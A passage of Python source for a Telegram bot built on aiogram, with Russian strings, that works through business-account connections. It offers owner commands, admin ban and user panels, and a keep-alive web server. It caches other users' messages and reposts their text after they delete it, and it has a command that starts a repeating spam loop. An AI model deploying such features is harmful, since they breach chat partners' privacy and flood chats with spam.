                    save_business_account(conn_info.user.id, conn_info.user.username, conn_info.user.first_name)
                    owner_id = int(conn_info.user.id)
                except: pass
            is_from_me = (uid == owner_id) if owner_id else False
        else:
            is_from_me = (uid == chat_id) or (message.chat.type in ["group", "supergroup"])

        if bot_id is None:
            me = await bot.get_me()
            bot_id = me.id

        if bc_id:
            if bc_id not in active_chats: active_chats[bc_id] = set()
            active_chats[bc_id].add(chat_id)

        if message.text:
            cache_key = (chat_id, message.message_id)
            msg_cache[cache_key] = {
                "text": message.text, 
                "user": message.from_user.first_name or "Пользователь",
                "user_id": uid,
                "chat_id": chat_id,
                "bc_id": bc_id
            }
            if len(msg_cache) > 5000:
                msg_cache.pop(next(iter(msg_cache)))

        # МУТ
        if uid in mutes and datetime.now() < mutes[uid]["until"]:
            await delete_msg(chat_id, message.message_id, bc_id)
            return

        # КАЛЬКУЛЯТОР
        text_raw = message.text
        if text_raw and is_calculator_expression(text_raw):
            result, error = calculate_expression(text_raw)
            if result is not None:
                formatted_result = f"{result:.10f}".rstrip('0').rstrip('.') if isinstance(result, float) else str(result)
                new_text = f"{text_raw} = <b>{formatted_result}</b>"
                edited = await edit_message(chat_id, message.message_id, new_text, bc_id, parse_mode="HTML")
                if not edited:
                    try:
                        kwargs = {"chat_id": chat_id, "text": new_text, "parse_mode": "HTML"}
                        if bc_id: kwargs["business_connection_id"] = bc_id
                        await bot.send_message(**kwargs)
                    except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
                return
            elif error:
                try:
                    kwargs = {"chat_id": chat_id, "text": error, "parse_mode": "HTML"}
                    if bc_id: kwargs["business_connection_id"] = bc_id
                    await bot.send_message(**kwargs)
                except Exception as e: logging.error(f"Ошибка калькулятора: {e}")
                return

        # ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА
        if not is_from_me: return

        if uid in mutes and datetime.now() < mutes[uid]["until"]:
            await delete_msg(chat_id, message.message_id, bc_id)
            return

        if chat_id in reply_guard_chats and message.reply_to_message:
            await delete_msg(chat_id, message.message_id, bc_id)
            return

        if not text_raw: return
        low = text_raw.lower().strip()
        task_key = (chat_id, bc_id)
        current_owner = owner_id or uid

        if low == ".стоп":
            save_setting(chat_id, 'enabled_links', False)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == ".старт":
            save_setting(chat_id, 'enabled_links', True)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low.startswith("+линк"):
            parts = text_raw.split(maxsplit=1)
            if len(parts) > 1:
                new_link = parts[1].strip()
                if not new_link.startswith("http"): new_link = "https://t.me/" + new_link.lstrip("@")
                CHANNEL_LINK = new_link
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low.startswith("подмена "):
            parts = text_raw.split(maxsplit=2)
            if len(parts) >= 2:
                if parts[1].lower() == "выкл":
                    save_substitution(chat_id, None, None)
                else:
                    mode = int(parts[2]) if len(parts) == 3 and parts[2] in ["1", "2"] else 1
                    save_substitution(chat_id, parts[1], mode)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "печать -":
            save_setting(chat_id, 'typing_disabled', True)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "печать +":
            save_setting(chat_id, 'typing_disabled', False)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "+реплай":
            save_setting(chat_id, 'reply_guard', True)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "-реплай":
            save_setting(chat_id, 'reply_guard', False)
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low == "ss":
            await clear_cmd(chat_id, message.message_id, bc_id)
            text = user_spam_texts.get(str(current_owner))
            if not text:
                kwargs = {
                    "chat_id": chat_id,
                    "text": "⚠️ Сначала задайте текст через команду: <code>set [текст]</code>",
                    "parse_mode": "HTML"
                }
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
                return
            reply_to = message.reply_to_message.message_id if message.reply_to_message else None
            if task_key in spam_tasks: spam_tasks[task_key].cancel()
            spam_tasks[task_key] = asyncio.create_task(spam_worker(chat_id, bc_id, reply_to, text))
            return
        if low == "dd":
            await clear_cmd(chat_id, message.message_id, bc_id)
            if task_key in spam_tasks:
                spam_tasks[task_key].cancel()
                del spam_tasks[task_key]
            return
        if low.startswith("set "):
            save_spam_text(str(current_owner), text_raw[4:].strip())
            await clear_cmd(chat_id, message.message_id, bc_id)
            return
        if low.startswith(".мут") or low.startswith("!мут") or low.startswith(".ут"):
            try:
                minutes = int(re.search(r"\d+", text_raw).group())
                if message.reply_to_message and message.reply_to_message.from_user:
                    target_user = message.reply_to_message.from_user
                    target_id = target_user.id
                    target_name = target_user.first_name
                else:
                    target_id = chat_id
                    target_name = message.chat.first_name or "Пользователь"
                
                mutes[target_id] = {"until": datetime.now() + timedelta(minutes=minutes)}
                asyncio.create_task(unmute(target_id, chat_id, bc_id, target_name))
                await clear_cmd(chat_id, message.message_id, bc_id)
                
                user_link = get_user_mention(target_id, target_name)
                kwargs = {
                    "chat_id": chat_id,
                    "text": f"🔇 {user_link} выдан <b>МУТ</b> на {minutes} мин.",
                    "parse_mode": "HTML"
                }
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
            except: pass
            return
        if low in [".размут", "!размут"]:
            if message.reply_to_message and message.reply_to_message.from_user:
                target_user = message.reply_to_message.from_user
                target_id = target_user.id
                target_name = target_user.first_name
            else:
                target_id = chat_id
                target_name = message.chat.first_name or "Пользователь"
            mutes.pop(target_id, None)
            await clear_cmd(chat_id, message.message_id, bc_id)
            user_link = get_user_mention(target_id, target_name)
            kwargs = {
                "chat_id": chat_id,
                "text": f"🔊 С {user_link} снят <b>МУТ</b>.",
                "parse_mode": "HTML"
            }
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs)
            return
        if low in ["мой ид", "моид"]:
            await clear_cmd(chat_id, message.message_id, bc_id)
            my_link = get_user_mention(uid, message.from_user.first_name)
            kwargs = {
                "chat_id": chat_id,
                "text": f"🆔 {my_link} (<code>{uid}</code>)",
                "parse_mode": "HTML"
            }
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs)
            return
        if low in ["твой ид", "твоид"]:
            await clear_cmd(chat_id, message.message_id, bc_id)
            target_user = message.reply_to_message.from_user if message.reply_to_message else None
            target_id = target_user.id if target_user else (chat_id if chat_id > 0 else None)
            if target_id:
                t_fname = target_user.first_name if target_user else None
                t_link = get_user_mention(target_id, t_fname)
                kwargs = {
                    "chat_id": chat_id,
                    "text": f"🆔 {t_link} (<code>{target_id}</code>)",
                    "parse_mode": "HTML"
                }
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
            return
        if low == "!команды":
            await clear_cmd(chat_id, message.message_id, bc_id)
            kwargs = {
                "chat_id": chat_id,
                "text": TEXT_COMMANDS_HELP,
                "parse_mode": "HTML"
            }
            if bc_id: kwargs["business_connection_id"] = bc_id
            await bot.send_message(**kwargs)
            return

        # Подмена текста
        final_text = text_raw
        need_modify = False
        parse_mode = None

        if chat_id in substitutions:
            sub = substitutions[chat_id]
            final_text = f"{sub['text']} {text_raw}" if sub["mode"] == 1 else f"{text_raw} {sub['text']}"
            need_modify = True
            parse_mode = "HTML"

        # Авто-ссылка (глобальная)
        if chat_id in link_chats:
            if CHANNEL_LINK:
                has_link = False
                if message.entities:
                    for entity in message.entities:
                        if entity.type in ["url", "text_link"]:
                            has_link = True
                            break
                if not has_link and CHANNEL_LINK not in final_text:
                    final_text = f'<a href="{CHANNEL_LINK}">{final_text}</a>'
                    need_modify = True
                    parse_mode = "HTML"

        if need_modify:
            await edit_message(chat_id, message.message_id, final_text, bc_id, parse_mode=parse_mode)

    except Exception as e:
        logging.error(f"❌ Ошибка обработки сообщения: {e}")

# ---- ОБРАБОТЧИК УДАЛЕНИЙ ----
@dp.update()
async def global_update_handler(update: Update, bot: Bot):
    try:
        if update.deleted_business_messages:
            data = update.deleted_business_messages
            bc_id = data.business_connection_id
            msg_ids = set(data.message_ids)
            for (cached_chat_id, cached_msg_id), cached in list(msg_cache.items()):
                if cached_msg_id in msg_ids:
                    uid = cached['user_id']
                    if uid == bot_id:
                        msg_cache.pop((cached_chat_id, cached_msg_id), None)
                        continue
                    user_link = get_user_mention(uid, cached['user'])
                    text_to_send = (
                        f"👤 {user_link} <b>удалил(а) сообщение ↓</b>\n\n"
                        f"💬 {cached['text']}"
                    )
                    kwargs = {
                        "chat_id": cached_chat_id,
                        "text": text_to_send,
                        "parse_mode": "HTML"
                    }
                    bc_target = bc_id or cached.get("bc_id")
                    if bc_target: kwargs["business_connection_id"] = bc_target
                    await bot.send_message(**kwargs)
                    msg_cache.pop((cached_chat_id, cached_msg_id), None)
    except Exception as e:
        logging.error(f"❌ Ошибка обработчика удалений: {e}")

# ---- АДМИН-КОМАНДЫ БАНА ----
async def resolve_user_id(target_raw: str):
    target = target_raw.strip()
    if target.startswith("@"):
        uname = target.lstrip("@").lower()
        res = user_usernames.get(uname)
        return int(res) if res else None
    elif target.isdigit():
        return int(target)
    return None

@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        target_id = await resolve_user_id(arg)
        if target_id:
            set_user_ban(target_id, True)
            delete_business_account(target_id)
            delete_manual_user(target_id)
            user_link = get_user_mention(target_id)
            await message.answer(f"🚫 {user_link} <b>заблокирован</b>!", parse_mode="HTML")
        else:
            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
    except:
        await message.answer("Формат: <code>/ban 123456789</code> или <code>/ban @username</code>", parse_mode="HTML")

@dp.message(Command("unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        target_id = await resolve_user_id(arg)
        if target_id:
            set_user_ban(target_id, False)
            user_link = get_user_mention(target_id)
            await message.answer(f"✅ {user_link} <b>разблокирован</b>!", parse_mode="HTML")
        else:
            await message.answer(f"❌ Пользователь <code>{arg}</code> не найден.", parse_mode="HTML")
    except:
        await message.answer("Формат: <code>/unban 123456789</code> или <code>/unban @username</code>", parse_mode="HTML")

# ---- ОБРАБОТЧИКИ ДОБАВЛЕНИЯ ПОЛЬЗОВАТЕЛЕЙ ----
@dp.callback_query(F.data == "admin_add_user")
async def admin_add_user(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer()
        return
    
    await callback.message.edit_text(
        "➕ <b>Добавление пользователя</b>\n\n"
        "Отправьте ID или @username пользователя, которого хотите добавить.\n"
        "Например: <code>123456789</code> или <code>@username</code>\n\n"
        "Чтобы отменить, нажмите кнопку «Назад».",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_panel_back")]
        ]),
        parse_mode="HTML"
    )
    await callback.answer()

# Обработчик для добавления пользователя через ввод
@dp.message()
async def handle_add_user(message: Message):
    if message.from_user.id != ADMIN_ID: return
    if message.text and (message.text.startswith("@") or (message.text.isdigit() and len(message.text) > 5)):
        target = message.text.strip()
        target_id = await resolve_user_id(target)
        
        if target_id:
            users = get_all_users()
            existing = [u for u in users if u[0] == target_id]
            
            if existing:
                await message.answer(f"ℹ️ Пользователь уже есть в списке.")
            else:
                try:
                    user_info = await bot.get_chat(target_id)
                    username = user_info.username or None
                    first_name = user_info.first_name or "Пользователь"
                    save_manual_user(target_id, username, first_name)
                    save_user_info(target_id, username, first_name)
                    
                    user_link = get_user_mention(target_id, first_name)
                    await message.answer(f"✅ {user_link} <b>добавлен</b> в список пользователей!", parse_mode="HTML")
                except Exception as e:
                    await message.answer(f"❌ Ошибка при добавлении: {str(e)}")
        else:
            await message.answer(f"❌ Пользователь <code>{target}</code> не найден.", parse_mode="HTML")

# ---- ОБРАБОТЧИКИ АДМИН-КНОПОК ----
@dp.callback_query()
async def process_callbacks(callback: CallbackQuery, state: FSMContext):
    data = callback.data
    uid = callback.from_user.id
    
    if data == "btn_features":
        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
        await callback.answer()
        return
    if data == "btn_how_to_connect":
        await callback.answer()
        return
    if data == "btn_group_auth":
        await group_auth(callback, state)
        return
    
    if data == "btn_admin_panel":
        if uid != ADMIN_ID:
            await callback.answer()
            return
        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer()
        return

    if uid != ADMIN_ID:
        await callback.answer()
        return

    if data == "admin_panel_back":
        await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer()
        return

    if data == "admin_stats":
        business_users = get_business_accounts()
        manual_users = get_all_users()
        total_manual = len([u for u in manual_users if u[4] == 'manual'])
        
        await callback.message.edit_text(
            f"📊 <b>СТАТИСТИКА:</b>\n\n"
            f"• Бизнес-аккаунтов: <code>{len(business_users)}</code>\n"
            f"• Ручных пользователей: <code>{total_manual}</code>\n"
            f"• Всего пользователей: <code>{len(manual_users)}</code>\n"
            f"• Юзеров в базе: <code>{len(user_names)}</code>\n"
            f"• Забанено: <code>{len(banned_users)}</code>",
            reply_markup=get_admin_keyboard(), parse_mode="HTML"
        )
        
    elif data == "admin_users":
        await callback.message.edit_text(
            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
            "📱 — подключены через бизнес-аккаунт\n"
            "👤 — добавлены вручную\n\n"
            "Выберите пользователя для управления:",
            reply_markup=get_users_keyboard(0),
            parse_mode="HTML"
        )
        
    elif data.startswith("users_page_"):
        page = int(data.split("_")[2])
        await callback.message.edit_text(
            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
            "📱 — подключены через бизнес-аккаунт\n"
            "👤 — добавлены вручную\n\n"
            "Выберите пользователя для управления:",
            reply_markup=get_users_keyboard(page),
            parse_mode="HTML"
        )
        
    elif data.startswith("user_"):
        user_id = int(data.split("_")[1])
        
        users = get_all_users()
        user_info = None
        user_type = "unknown"
        for u in users:
            if u[0] == user_id:
                user_info = u
                user_type = u[4]
                break
        
        user_link = get_user_mention(user_id)
        
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
            [InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_user_{user_id}")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
        ])
        
        type_text = "📱 Бизнес-аккаунт" if user_type == "business" else "👤 Ручное добавление"
        await callback.message.edit_text(
            f"👤 <b>Информация о пользователе</b>\n\n"
            f"ID: <code>{user_id}</code>\n"
            f"Имя: {user_link}\n"
            f"Тип: {type_text}\n\n"
            f"Выберите действие:",
            reply_markup=kb,
            parse_mode="HTML"
        )
        
    elif data.startswith("delete_user_"):
        user_id = int(data.split("_")[2])
        delete_business_account(user_id)
        delete_manual_user(user_id)
        await callback.answer("✅ Пользователь удален из списка!", show_alert=True)
        await callback.message.edit_text(
            "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
            "📱 — подключены через бизнес-аккаунт\n"
            "👤 — добавлены вручную\n\n"
            "Выберите пользователя для управления:",
            reply_markup=get_users_keyboard(0),
            parse_mode="HTML"
        )
        
    elif data.startswith("ban_user_"):
        user_id = int(data.split("_")[2])
        if user_id in banned_users:
            set_user_ban(user_id, False)
            await callback.answer("✅ Пользователь разбанен!", show_alert=True)
        else:
            set_user_ban(user_id, True)
            await callback.answer("🚫 Пользователь забанен!", show_alert=True)
        
        user_link = get_user_mention(user_id)
        status = "забанен" if user_id in banned_users else "разбанен"
        await callback.message.edit_text(
            f"👤 <b>Информация о пользователе</b>\n\n"
            f"ID: <code>{user_id}</code>\n"
            f"Имя: {user_link}\n"
            f"Статус: {status}\n\n"
            f"Выберите действие:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")],
                [InlineKeyboardButton(text="🚫 Забанить/Разбанить", callback_data=f"ban_user_{user_id}")],
                [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]
            ]),
            parse_mode="HTML"
        )
        
    elif data == "admin_ban_prompt":
        await callback.message.edit_text(
            "🚫 <b>Управление банами</b>\n\n"
            "Команды бана/разбана:\n\n"
            "• <code>/ban 123456789</code> или <code>/ban @username</code>\n"
            "• <code>/unban 123456789</code> или <code>/unban @username</code>\n\n"
            "Также можно использовать кнопки в списке пользователей.",
            reply_markup=get_admin_keyboard(), parse_mode="HTML"
        )
        
    elif data == "admin_add_user":
        await admin_add_user(callback)
        
    await callback.answer()

# ---- ВЕБ-СЕРВЕР ----
async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/health', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

# ---- ЗАПУСК ----
async def main():
    await start_web_server()
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except: pass
    asyncio.create_task(global_typing_loop())
    asyncio.create_task(promo_broadcaster())
    asyncio.create_task(check_promo_deletions())
    asyncio.create_task(clean_inactive_connections())
    logging.info("🚀 БОТ ЗАПУЩЕН!")
    await dp.start_polling(
        bot, 
        allowed_updates=["message", "business_connection", "business_message", "edited_business_message", "deleted_business_messages", "callback_query"]
    )

if __name__ == "__main__":
    asyncio.run(main())
